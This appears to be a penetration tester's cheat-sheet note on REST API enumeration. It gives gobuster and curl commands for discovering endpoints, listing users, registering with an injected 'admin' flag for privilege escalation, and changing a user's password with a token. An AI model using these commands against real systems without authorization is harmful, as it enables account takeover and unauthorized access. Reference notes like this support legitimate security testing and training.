---
tags:
  - Discovery
  - Foundational
  - HTTP
  - Reconnaissance
  - Web_Application
---

## API Enumeration
resources: [HackTricks - Web API Pentesting](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/web-api-pentesting.html)

> [!info] REST APIs often follow pattern **/api_name/v1** or **/api_name/v2**. Brute force to discover endpoints, then probe with different HTTP methods.

### Create Pattern File
> [!tip] Use **Gobuster** pattern feature to append version numbers to wordlist entries.

```bash
echo '{GOBUSTER}/v1' > pattern
echo '{GOBUSTER}/v2' >> pattern
```

### Brute Force API Paths
```bash
gobuster dir -u http://<Target>:<Port> -w /usr/share/wordlists/dirb/big.txt -p pattern
```

### Enumerate API Endpoint
```bash
curl -i http://<Target>:<Port>/<APIPath>
```

### Brute Force Sub-paths
```bash
gobuster dir -u http://<Target>:<Port>/<APIPath>/<Username>/ -w /usr/share/wordlists/dirb/small.txt
```

### GET Request
```bash
curl -i http://<Target>:<Port>/<APIPath>
```

### POST Request with JSON
```bash
curl -d '{"key":"value"}' -H 'Content-Type: application/json' http://<Target>:<Port>/<APIPath>
```

### PUT Request
> [!info] Often used to update/replace values instead of creating (**POST**).

```bash
curl -X 'PUT' -d '{"key":"value"}' -H 'Content-Type: application/json' http://<Target>:<Port>/<APIPath>
```

### Include Authorization Token
```bash
curl -H 'Authorization: OAuth <Token>' http://<Target>:<Port>/<APIPath>
```

### User Enumeration
> Query **/users** endpoint to list usernames and emails.

```bash
curl http://<Target>:<Port>/users/v1
```

### Registration with Admin Flag
> [!tip] Try adding **admin** parameter when registering new user.

```bash
curl -d '{"username":"attacker","password":"pass","email":"a@b.com","admin":"True"}' -H 'Content-Type: application/json' http://<Target>:<Port>/users/v1/register
```

### Login to Get JWT Token
```bash
curl -d '{"username":"<Username>","password":"<Password>"}' -H 'Content-Type: application/json' http://<Target>:<Port>/users/v1/login
```

### Change User Password
```bash
curl -X 'PUT' -H 'Authorization: OAuth <Token>' -H 'Content-Type: application/json' -d '{"password":"<NewPassword>"}' http://<Target>:<Port>/users/v1/<Username>/password
```
